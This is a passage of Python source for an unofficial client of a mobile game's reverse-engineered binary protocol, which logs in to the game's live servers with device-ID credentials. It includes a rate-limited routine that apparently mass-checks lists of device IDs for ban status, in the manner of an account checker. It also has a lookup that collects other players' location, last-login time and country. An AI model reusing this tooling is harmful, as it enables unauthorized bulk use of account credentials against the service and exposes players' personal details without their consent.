        base_no_suffix = re.sub(r"\s*collector\s*$", "", base_raw.lower()).strip()
        for k, v in _COLLECTOR_BASE_LOWER.items():
            if re.sub(r"\s*collector\s*$", "", k).strip() == base_no_suffix:
                canonical = v
                break
    if canonical is None:
        canonical = base_raw
    full = f"{canonical} {roman}".strip() if roman else canonical
    return (canonical, roman, full)


def _is_hidden_tier_user(tier_base):
    return tier_base in HIDDEN_TIERS_USER


def _base_sort_key(base):
    try:
        return COLLECTOR_BASE_ORDER.index(base)
    except ValueError:
        return 999


# ======================================================================
#  SDP PROTOCOL
# ======================================================================
class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8


class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items()):
            self._pack(tag, value)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpDataType) and value == SdpDataType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value):
        r = bytearray()
        while value >= 0x80:
            r.append((value & 0x7F) | 0x80)
            value >>= 7
        r.append(value & 0x7F)
        return bytes(r)

    def _read_number(self):
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.offset + n - 1 < len(self.data) and self.data[self.offset + n - 1] >= 0x80:
            if self.offset + n >= len(self.data):
                break
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag, dt):
        if tag < 15:
            self.data += bytes([(dt.value << 4) | tag])
        else:
            self.data += bytes([(dt.value << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag, value):
        if isinstance(value, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            packed = struct.pack("<d", value)
            self.data += self._write_number(len(packed)) + packed
        elif isinstance(value, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(encoded)) + encoded
        elif isinstance(value, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pack(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    self._pack(0, k)
                    self._pack(0, v)

    def _unpack(self):
        try:
            if self.offset >= len(self.data):
                return 0, None
            header = self.data[self.offset]
            tag = header & 0xF
            dt = SdpDataType(header >> 4)
            self.offset += 1
            if tag == 15:
                tag = self._read_number()
            if dt == SdpDataType.INTEGER_POSITIVE:
                return tag, self._read_number()
            elif dt == SdpDataType.INTEGER_NEGATIVE:
                return tag, -self._read_number()
            elif dt == SdpDataType.FLOAT:
                n = self._read_number()
                v = self.data[self.offset:self.offset+n].ljust(4, b'\x00')
                self.offset += n
                return tag, struct.unpack("<f", v)[0]
            elif dt == SdpDataType.DOUBLE:
                n = self._read_number()
                v = self.data[self.offset:self.offset+n].ljust(8, b'\x00')
                self.offset += n
                return tag, struct.unpack("<d", v)[0]
            elif dt == SdpDataType.STRING:
                length = self._read_number()
                try:
                    value = self.data[self.offset:self.offset+length].decode('utf-8')
                except UnicodeDecodeError:
                    value = self.data[self.offset:self.offset+length]
                self.offset += length
                return tag, value
            elif dt == SdpDataType.LIST:
                length = self._read_number()
                value = []
                for _ in range(length):
                    _, item = self._unpack()
                    value.append(item)
                return tag, value
            elif dt == SdpDataType.DICT:
                length = self._read_number()
                value = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    value[k] = v
                return tag, value
            elif dt == SdpDataType.STRUCT_BEGIN:
                sd = {}
                while True:
                    sub_tag, sub_value = self._unpack()
                    if isinstance(sub_value, SdpDataType) and sub_value == SdpDataType.STRUCT_END:
                        break
                    sd[sub_tag] = sub_value
                return tag, SdpStruct(sd)
            elif dt == SdpDataType.STRUCT_END:
                return tag, SdpDataType.STRUCT_END
        except Exception:
            pass
        return 0, None


# ======================================================================
#  CONNECTIONS
# ======================================================================
class BaseConnection:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        self.last_header_size = 0

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *a):
        self.cleanup()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(15)

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            self.sequence = 1
            self.socket = None

    def send_data(self, id, sdp):
        if not self.socket:
            raise ConnectionError("Socket not connected")
        packet = SdpStruct({0: id, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        self.socket.sendall(flags.to_bytes(4, 'big') + buf)
        self.sequence += 1

    def recv_data(self):
        try:
            if not self.socket:
                return None, None
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data
            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            ct = flags >> 24
            self.last_header_size = size
            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data
            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]
            if ct == 1:
                data = zlib.decompress(data)
            elif ct == 16:
                data = zstd.decompress(data)
            elif ct in (2, 3, 18):
                c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                decrypted = c.decrypt(data[:-1] if len(data) % 16 != 0 else data)
                data = decrypted.rstrip(b'\x00')
                if ct == 3:
                    data = zlib.decompress(data)
                elif ct == 18:
                    data = zstd.decompress(data)
            result = SdpStruct(data)
            id_ = result.get(0)
            if id_ is None:
                return None, None
            res = result.get(6)
            if not res or not isinstance(res, bytes):
                res = result.get(5)
                if not res or not isinstance(res, bytes):
                    return id_, None
            return id_, SdpStruct(res)
        except socket.timeout:
            return -1, None
        except Exception:
            return None, None


class GameLogin(BaseConnection):
    """Standalone 2-step login. Returns (acc_id, zone_id, status)."""
    def __init__(self, device_id):
        super().__init__('login.ml.youngjoygame.com', 30021)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""

    def run(self):
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                acc = res.get(0)
                zone = None
                zd = res.get(2)
                if isinstance(zd, list) and zd:
                    first = zd[0]
                    zone = first.get(0, 0) if isinstance(first, dict) else first
                elif isinstance(zd, dict):
                    zone = zd.get(0, 0)
                else:
                    zone = zd or 0
                if not zone:
                    zone = res.get(3) or res.get(5) or 0
                if acc and zone:
                    return acc, zone, "NORMAL"
                return acc, zone, "NO_ZONE"
            return None, None, f"FAIL(PID={pid})"
        except Exception as e:
            return None, None, f"ERROR({type(e).__name__})"
        finally:
            self.cleanup()


class GameConnection(BaseConnection):
    def __init__(self, device_id, device_model=None):
        super().__init__('login.ml.youngjoygame.com', 30021)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei_md5 = raw[:32] if len(raw) >= 32 else raw
        self.android_id = raw[32:48] if len(raw) >= 48 else ""
        self.advertising_id = raw[48:] if len(raw) > 48 else ""
        self.channel = CHANNEL
        self.client_version = CLIENT_VERSION
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.creation_ts = 0
        self.ban_status = "NORMAL"

    def login_to_login_server(self):
        if not self.socket or self.host != 'login.ml.youngjoygame.com' or self.port != 30021:
            self.cleanup()
            self.host = 'login.ml.youngjoygame.com'
            self.port = 30021
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version, 3: self.channel, 4: LANGUAGE
        }))
        id_, res = self.recv_data()
        if id_ == 2 and res:
            self.account_id = res.get(0)
            sk = res.get(1)
            if sk is None:
                return False
            self.session_key = sk
            zd = res.get(2)
            if isinstance(zd, list) and zd:
                try:
                    first = zd[0]
                    if isinstance(first, dict):
                        self.zone_id = first.get(0, 0)
                    else:
                        self.zone_id = first
                except Exception:
                    return False
            elif isinstance(zd, dict):
                self.zone_id = zd.get(0, 0)
            else:
                self.zone_id = zd or 0
            if not self.zone_id:
                self.zone_id = res.get(3) or res.get(5) or 0
            if not self.zone_id:
                self.ban_status = "LOGIN_FAILED_NO_ZONE"
                return False
            self.creation_ts = res.get(19, 0)
            self.ban_status = "NORMAL"
            return True
        if res and isinstance(res, dict):
            for v in res.values():
                if isinstance(v, str) and any(b in v.lower() for b in ('ban', 'suspend', 'freeze')):
                    self.ban_status = f"BANNED: {v}"
                    return False
        self.ban_status = f"LOGIN_FAILED(PID={id_})"
        return False

    def get_game_server(self):
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key,
            2: self.client_version, 5: self.zone_id, 6: self.channel
        }))
        id_, res = self.recv_data()
        if id_ == 6 and res:
            gs = res[1]
            self.game_server_host, self.game_server_port = gs.split(':')
            self.game_server_port = int(self.game_server_port)
            return True
        return False

    def connect_to_game_server(self):
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            4: self.client_version, 13: self.channel, 15: self.device_id
        }))
        deadline = time.time() + 15.0
        while time.time() < deadline:
            id_, res = self.recv_data()
            if id_ is None:
                return False
            elif id_ == 10002:
                return True
            elif id_ == -1:
                continue
        return False

    def check_ban_status(self):
        try:
            self.send_data(10101, SdpStruct({0: 0, 2: 2}))
            for _ in range(3):
                pid, res = self.recv_data()
                if pid == 20001 and res and isinstance(res, dict) and 0 in res:
                    binfo = res[0]
                    if isinstance(binfo, dict):
                        reason = binfo.get('ban_reason', '?')
                        reason_name = BAN_REASON_MAP.get(str(reason), f"Code {reason}")
                        d = binfo.get('endtime_day', '0')
                        h = binfo.get('endtime_hour', '0')
                        m = binfo.get('endtime_min', '0')
                        s = binfo.get('endtime_sec', '0')
                        self.ban_status = f"BANNED (Reason: {reason_name} | Remaining: {d}d {h}h {m}m {s}s)"
                        return self.ban_status
                if pid in (-1, None, 20002):
                    break
            return self.ban_status
        except Exception:
            return self.ban_status

    def lookup_player(self, search_value, search_type="id", server_filter=None, zone_id=None):
        if search_type == "id":
            payload = {1: int(search_value)}
            if zone_id is not None:
                payload[2] = int(zone_id)
            lookup_data = SdpStruct(payload)
        else:
            lookup_data = SdpStruct({0: str(search_value).strip()})
        self.send_data(11153, lookup_data)
        c = 0
        for _ in range(8):
            id_, res = self.recv_data()
            if id_ is None or id_ == -1:
                return None
            if id_ == 11154:
                if search_type == "nickname" and server_filter is not None:
                    return self.filter_by_server(res, server_filter)
                return res
            if id_ == 20001:
                c += 1
                if c >= 2:
                    return None
        return None

    def get_role_info(self, role_id, zone_id):
        try:
            self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
            for _ in range(4):
                pid, res = self.recv_data()
                if pid in (-1, None):
                    break
                if pid == 10129:
                    return res
        except Exception:
            pass
        return None

    def get_skin_role_info(self, role_id, zone_id):
        try:
            self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            for _ in range(4):
                pid, res = self.recv_data()
                if pid in (-1, None):
                    break
                if pid == 10144:
                    return res
        except Exception:
            pass
        return None

    def filter_by_server(self, result, target_server):
        if not result or not result.get(0):
            return None
        for p in result[0]:
            if isinstance(p, dict) and p.get(1) == target_server:
                return {0: [p]}
        return None

    def __enter__(self):
        super().__enter__()
        if not self.login_to_login_server():
            raise ConnectionError("LOGIN_FAILED")
        if not self.get_game_server():
            raise ConnectionError("SERVER_SELECTION_FAILED")
        if not self.connect_to_game_server():
            raise ConnectionError("GS_CONNECT_FAILED")
        return self


# ======================================================================
#  BAN CONNECTION
# ======================================================================
class _BanConn:
    __slots__ = ('host','port','seq','sock','qbuf','device_id','imei_md5','android_id',
                 'advertising_id','channel','client_version','account_id','session_key',
                 'zone_id','gs_host','gs_port','last_raw','last_dec')

    def __init__(self, device_id):
        self.host = 'login.ml.youngjoygame.com'
        self.port = 30021
        self.seq = 1
        self.sock = None
        self.qbuf = b''
        self.device_id = device_id
        self.last_raw = b''
        self.last_dec = b''
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei_md5 = raw[:32] if len(raw) >= 32 else raw
        self.android_id = raw[32:48] if len(raw) >= 48 else ""
        self.advertising_id = raw[48:] if len(raw) > 48 else ""
        self.channel = CHANNEL
        self.client_version = CLIENT_VERSION
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.gs_host = ''
        self.gs_port = 0

    def connect(self, host=None, port=None):
        if host: self.host = host
        if port: self.port = port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(20)
        s.connect((self.host, self.port))
        s.settimeout(18)
        self.sock = s

    def close(self):
        if self.sock:
            try: self.sock.close()
            except Exception: pass
            self.seq = 1; self.sock = None

    def send(self, pkt_id, sdp):
        pkt = SdpStruct({0: pkt_id, 1: self.seq, 5: sdp.data}).data
        buf = zstd.compress(pkt)
        self.sock.sendall(((len(buf) + 4) | (16 << 24)).to_bytes(4, 'big') + buf)
        self.seq += 1

    def recv(self):
        try:
            while len(self.qbuf) < 4:
                d = self.sock.recv(4096)
                if not d: return None, None
                self.qbuf += d
            flags = int.from_bytes(self.qbuf[:4], 'big')
            size = flags & 0xFFFFFF; ct = flags >> 24
            if size < 4 or size > 10_000_000: return None, None
            while len(self.qbuf) < size:
                d = self.sock.recv(4096)
                if not d: return None, None
                self.qbuf += d
            data = self.qbuf[4:size]; self.qbuf = self.qbuf[size:]
            if ct == 1: data = zlib.decompress(data)
            elif ct == 16: data = zstd.decompress(data)
            elif ct in (2, 3, 18):
                c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = c.decrypt(data[:-1] if len(data) % 16 != 0 else data).rstrip(b'\x00')
                if ct == 3: data = zlib.decompress(data)
                elif ct == 18: data = zstd.decompress(data)
            r = SdpStruct(data); pid = r.get(0)
            if pid is None: return None, None
            res = r.get(6) or r.get(5)
            if not res or not isinstance(res, bytes): return pid, None
            return pid, SdpStruct(res)
        except socket.timeout: return -1, None
        except Exception: return None, None


def _parse_ban_20001(res):
    if not res: return None
    reason_code = day = hour = minute = sec = None
    stack = [dict(res)]
    while stack:
        obj = stack.pop()
        if isinstance(obj, dict):
            for k, v in obj.items():
                kl = str(k).lower() if isinstance(k, str) else str(k)
                if kl == 'ban_reason': reason_code = str(v)
                elif kl == 'endtime_day': day = str(v)
                elif kl == 'endtime_hour': hour = str(v)
                elif kl == 'endtime_min': minute = str(v)
                elif kl == 'endtime_sec': sec = str(v)
                if isinstance(v, (dict, list)): stack.append(v)
        elif isinstance(obj, list):
            for it in obj:
                if isinstance(it, (dict, list)): stack.append(it)
    if reason_code is not None or day is not None:
        info = {'ban_reason': reason_code or '?',
                'reason_name': BAN_REASON_MAP.get(reason_code, f"Code {reason_code}")}
        if day is not None: info['endtime_day'] = day
        if hour is not None: info['endtime_hour'] = hour
        if minute is not None: info['endtime_min'] = minute
        if sec is not None: info['endtime_sec'] = sec
        return info
    return None


def _fmt_ban(did, info):
    reason = info.get('reason_name') or info.get('ban_reason') or "Banned"
    code = info.get('ban_reason', '?')
    day = info.get('endtime_day')
    h = info.get('endtime_hour', '00'); m = info.get('endtime_min', '00'); s = info.get('endtime_sec', '00')
    if day is not None:
        return f"{did} | Reason: {reason} (code {code}) | Duration: Day {day}, {h}:{m}:{s}"
    return f"{did} | Reason: {reason} (code {code})"


_ban_rate_lock = threading.Lock()
_ban_last_req = [0.0]
BAN_MIN_INTERVAL = 0.02


def _ban_rate_wait():
    with _ban_rate_lock:
        now = time.time()
        wait = BAN_MIN_INTERVAL - (now - _ban_last_req[0])
        if wait > 0:
            time.sleep(wait); now = time.time()
        _ban_last_req[0] = now


def _ban_check_one(device_id):
    _ban_rate_wait()
    c = _BanConn(device_id)
    try:
        try: c.connect('login.ml.youngjoygame.com', 30021)
        except socket.timeout: return "UNKNOWN", f"{device_id} | LOGIN_TIMEOUT", True
        except Exception: return "UNKNOWN", f"{device_id} | LOGIN_FAIL", True
        try:
            c.send(1, SdpStruct({
                0: c.device_id,
                1: f'gps_adid={c.advertising_id}&android_id={c.android_id}&device_unique_id={c.imei_md5}',
                2: c.client_version, 3: c.channel, 4: 'en'
            }))
        except Exception: return "UNKNOWN", f"{device_id} | LOGIN_SEND_FAIL", True
        pid, res = c.recv()
        if pid == -1: return "UNKNOWN", f"{device_id} | LOGIN_RESP_TIMEOUT", True
        if pid is None: return "UNKNOWN", f"{device_id} | LOGIN_CLOSED", True
        if pid != 2 or not res: return "UNKNOWN", f"{device_id} | LOGIN_BAD pkt={pid}", True
        acc = res.get(0); sk = res.get(1); zd = res.get(2)
        if acc is None or sk is None: return "UNKNOWN", f"{device_id} | NO_SESSION", False
        try:
            if isinstance(zd, dict): zid = zd.get(0, 0)
            elif isinstance(zd, list) and zd:
                zid = zd[0] if not isinstance(zd[0], dict) else zd[0].get(0, 0)
            else: zid = zd or 0
        except Exception: zid = 0
        if not zid: return "UNKNOWN", f"{device_id} | NO_ZONE", False
        c.account_id = acc; c.session_key = sk; c.zone_id = zid
        try:
            c.send(5, SdpStruct({0: acc, 1: sk, 2: c.client_version, 5: zid, 6: c.channel}))
        except Exception: return "UNKNOWN", f"{device_id} | GS_SEND_FAIL", True
        pid, res = c.recv()
        if pid == -1: return "UNKNOWN", f"{device_id} | GS_TIMEOUT", True
        if pid is None: return "UNKNOWN", f"{device_id} | GS_CLOSED", True
        if pid != 6 or not res: return "UNKNOWN", f"{device_id} | GS_BAD pkt={pid}", True
        gs = res.get(1)
        if not isinstance(gs, str) or ':' not in gs:
            return "UNKNOWN", f"{device_id} | GS_INVALID", False
        host, port_s = gs.split(':')
        try: port = int(port_s)
        except ValueError: return "UNKNOWN", f"{device_id} | GS_PORT_BAD", False
        c.close()
        try: c.connect(host, port)
        except socket.timeout: return "UNKNOWN", f"{device_id} | GS_CONN_TIMEOUT", True
        except Exception: return "UNKNOWN", f"{device_id} | GS_CONN_FAIL", True
        try:
            c.send(10001, SdpStruct({0: acc, 1: sk, 2: zid, 4: c.client_version, 13: c.channel, 15: c.device_id}))
            c.send(10101, SdpStruct({0: 0, 2: 2}))
        except Exception: return "UNKNOWN", f"{device_id} | ENTER_SEND_FAIL", True
        got_20001 = False
        deadline = time.time() + 30.0
        try: c.sock.settimeout(15.0)
        except Exception: pass
        while time.time() < deadline:
            pid, res = c.recv()
            if pid == -1:
                if got_20001: continue
                continue
            if pid is None:
                if got_20001: continue
                return "UNKNOWN", f"{device_id} | CLOSED_NO_20001", False
            if pid == 20001:
                got_20001 = True
                ban_info = _parse_ban_20001(res)
                if ban_info: return "BANNED", _fmt_ban(device_id, ban_info), False
                else: return "CLEAR", device_id, False
        return "UNKNOWN", f"{device_id} | NO_20001_AFTER_30S", True
    except Exception as e:
        return "UNKNOWN", f"{device_id} | EXC:{type(e).__name__}", True
    finally:
        c.close()


# ======================================================================
#  RANK MAPPING
# ======================================================================
def map_rank(p):
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    if p >= 136:
        stars = p - 136
        if stars >= 100:
            return f"Mythical Immortal ({stars}★)"
        if stars >= 50:
            return f"Mythical Glory ({stars}★)"
        if stars >= 25:
            return f"Mythical Honor ({stars}★)"
        return f"Mythic ({stars}★)"
    ranks = [
        (105, "Legend", 5, ["V", "IV", "III", "II", "I"]),
        (75, "Epic", 5, ["V", "IV", "III", "II", "I"]),
        (45, "Grandmaster", 5, ["V", "IV", "III", "II", "I"]),
        (25, "Master", 4, ["IV", "III", "II", "I"]),
        (10, "Elite", 3, ["IV", "III", "II", "I"]),
        (1, "Warrior", 3, ["III", "II", "I"]),
    ]
    for threshold, name, div_stars, div_names in ranks:
        if p >= threshold:
            offset = p - threshold
            div_idx = min(len(div_names)-1, offset // div_stars)
            star = (offset % div_stars) + 1
            return f"{name} {div_names[div_idx]} ({star}★)"
    return "Warrior III (1★)"


def map_collector_point(point):
    if point < 1000:
        return "No Tier"
    tiers = [(1000, 4000, "Amateur Collector"), (4000, 10000, "Junior Collector"),
             (10000, 22000, "Seasoned Collector"), (22000, 44000, "Expert Collector"),
             (44000, 84000, "Renowned Collector"), (84000, 160000, "Exalted Collector"),
             (160000, 280000, "Mega Collector"), (280000, float('inf'), "World Collector")]
    for min_p, max_p, name in tiers:
        if min_p <= point < max_p:
            if name == "World Collector":
                return name
            per_level = (max_p - min_p) / 5
            level = int((point - min_p) // per_level)
            roman = ["V", "IV", "III", "II", "I"][level]
            return f"{name} {roman}"
    return "Unknown"


def format_timestamp(timestamp):
    try:
        utc_dt = datetime.datetime.fromtimestamp(timestamp, datetime.timezone.utc)
        pht_dt = utc_dt + datetime.timedelta(hours=8)
        pht_date_str = pht_dt.strftime("%Y-%m-%d %H:%M")
        now_pht = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=8)
        delta = pht_dt - now_pht
        total_seconds = int(delta.total_seconds())
        if total_seconds >= 0:
            days = total_seconds // 86400
            hours = (total_seconds % 86400) // 3600
            minutes = (total_seconds % 3600) // 60
            rel_str = f"(in {days}d {hours}h {minutes}m)"
        else:
            total_seconds = abs(total_seconds)
            days = total_seconds // 86400
            hours = (total_seconds % 86400) // 3600
            minutes = (total_seconds % 3600) // 60
            rel_str = f"({days}d {hours}h {minutes}m ago)"
        return f"{pht_date_str} {rel_str} PHT"
    except Exception:
        return "Invalid timestamp"


def format_timestamp_full(timestamp):
    try:
        utc_dt = datetime.datetime.fromtimestamp(timestamp, datetime.timezone.utc)
        pht_dt = utc_dt + datetime.timedelta(hours=8)
        return pht_dt.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "Invalid timestamp"


# ======================================================================
#  V2L CASCADE
# ======================================================================
def get_v2l_status(conn, role_id, zone_id):
    try:
        conn.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None):
                break
            if pid == 10208 and res:
                data = dict(res)
                for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                    val = data.get(tag)
                    if val is not None:
                        if isinstance(val, (int, float)):
                            return "Enabled" if int(val) > 0 else "Disabled"
                        if isinstance(val, str):
                            if val.lower() in ("1", "true", "enabled", "yes"):
                                return "Enabled"
                            if val.lower() in ("0", "false", "disabled", "no"):
                                return "Disabled"
    except Exception:
        pass
    try:
        conn.send_data(10145, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None):
                break
            if pid in (10146, 10160) and res:
                data = dict(res)
                for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5]:
                    val = data.get(tag)
                    if val is not None:
                        if isinstance(val, (int, float)):
                            return "Enabled" if int(val) > 0 else "Disabled"
                        if isinstance(val, str):
                            if val.lower() in ("1", "true", "enabled", "yes"):
                                return "Enabled"
                            if val.lower() in ("0", "false", "disabled", "no"):
                                return "Disabled"
    except Exception:
        pass
    try:
        conn.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None):
                break
            if pid == 10144 and res:
                data = dict(res)
                for tag in [118, 5, 2, 3]:
                    nested = data.get(tag, {})
                    if isinstance(nested, dict):
                        for subtag in [10, 11, 13, 14, 15, 0, 2, 3, 5]:
                            val = nested.get(subtag)
                            if val is not None:
                                if isinstance(val, (int, float)):
                                    return "Enabled" if int(val) > 0 else "Disabled"
                                if isinstance(val, str):
                                    if val.lower() in ("1", "true", "enabled", "yes"):
                                        return "Enabled"
                                    if val.lower() in ("0", "false", "disabled", "no"):
                                        return "Disabled"
    except Exception:
        pass
    return "N/A"

def _to_int_safe(x):
    try:
        if isinstance(x, bool):
            return int(x)
        if isinstance(x, (int, float)):
            return int(x)
        if isinstance(x, str):
            m = re.search(r"-?\d+", x.replace(",", ""))
            if m:
                return int(m.group(0))
        if isinstance(x, dict):
            for _k in (0, "0", 1, "1"):
                if _k in x:
                    v2 = _to_int_safe(x[_k])
                    if v2:
                        return v2
    except Exception:
        pass
    return 0

def lookup_player_data(device_id, role_id, zone_id):
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.connect_to_game_server():
                return {"status": "error", "error": "GS_CONNECT_FAILED"}

            result = conn.lookup_player(role_id, "id", zone_id=zone_id)
            if not result:
                return {"status": "error", "error": "Lookup returned None"}

            role_info_data = None
            try:
                skin_role_info = conn.get_skin_role_info(role_id, zone_id)
                if skin_role_info and isinstance(skin_role_info, dict):
                    role_info_data = {k: v for k, v in skin_role_info.items()}
            except Exception:
                pass

            _v2l_data = None
            try:
                _v2l_data = conn.get_v2l_status(role_id, zone_id)
            except Exception:
                pass

            player_data = extract_player_data(
                result,
                role_info=role_info_data,
                creation_ts=conn.creation_ts,
                v2l_data=_v2l_data
            )
            if player_data:
                return {"status": "success", "player_data": player_data}
            return {"status": "error", "error": "Extract failed"}
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {"status": "error", "error": f"{type(e).__name__}: {e}"}

def extract_player_data(result, role_info=None, creation_ts=0, v2l_data=None):
    if not result:
        return None
    try:
        if isinstance(result, dict):
            arr = result.get(0)
        else:
            arr = result[0] if result else None
    except Exception:
        arr = None
    if not arr or not isinstance(arr, (list, tuple)) or len(arr) == 0:
        return None
    try:
        player_data = arr[0]
        if not isinstance(player_data, dict):
            return None

        nickname = player_data.get(2, "Unknown")
        player_id = player_data.get(0, "Unknown")
        server = player_data.get(1, "Unknown")
        level = player_data.get(3, "Unknown")
        skin = player_data.get(83, "Unknown")
        hero_count = player_data.get(4, 0)
        matches = player_data.get(17, 0)
        rating_score = player_data.get(9, 0)
        if role_info:
            hero_count = role_info.get(9, hero_count)
            matches = role_info.get(22, matches)

        location = "NOT FOUND"
        location_data = player_data.get(71, None)
        if location_data and isinstance(location_data, list) and len(location_data) >= 2:
            location = ", ".join(str(x) for x in location_data)

        last_login = player_data.get(5, 0)
        last_login_formatted = format_timestamp(last_login)
        last_login_country = player_data.get(87, "Unknown")
        create_account_country = player_data.get(97, "Unknown")

        squad_icon = player_data.get(31, "")
        squad_name = player_data.get(30, "")
        if isinstance(squad_name, str):
            squad_name = squad_name.replace("`", "").strip()
        else:
            squad_name = ""
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else "—"
        squad_id = 0
        if role_info and isinstance(role_info, dict):
            squad_id = role_info.get(34, 0)
        if not squad_id:
            squad_id = player_data.get(34, player_data.get(28, 0))
        squad_id_display = f"Squad ID: {squad_id}" if squad_id else "N/A"

        tag_95 = player_data.get(95)
        tag_8 = player_data.get(8)
        high_rank = map_rank(tag_95) if tag_95 is not None else "Unknown"
        current_rank = map_rank(tag_8) if tag_8 is not None else "Unknown"
        achievement_points = player_data.get(7, 0)

        tag_136 = player_data.get(136, {})
        collector_point = tag_136.get(9, 0) if isinstance(tag_136, dict) else 0
        collector_rank = tag_136.get(10, 0) if isinstance(tag_136, dict) else 0
        collector_tier = map_collector_point(collector_point)

        tag_91 = player_data.get(91, [])
        hero_history = [HERO_ID_MAP.get(hid, f"Unknown({hid})")
                        for hid in reversed(tag_91)] if tag_91 else ["Private / Not Available"]

        v2l_status = "N/A"
        if v2l_data and isinstance(v2l_data, dict):
            source = v2l_data.get("_source", 0)
            data = v2l_data.get("_data", {})
            tags_to_check = (10, 11) if source == 10208 else (0, 2, 3, 5)
            for _tag in tags_to_check:
                _v = data.get(_tag)
                if _v is not None:
                    try:
                        val = int(_v)
                        v2l_status = "Enabled" if val > 0 else "Disabled"
                        break
                    except (ValueError, TypeError):
                        pass

        followers = 0
        if role_info and isinstance(role_info, dict):
            followers = role_info.get(23, 0)
        if not followers:
            followers = player_data.get(15, 0)

        popularity = player_data.get(14, 0)
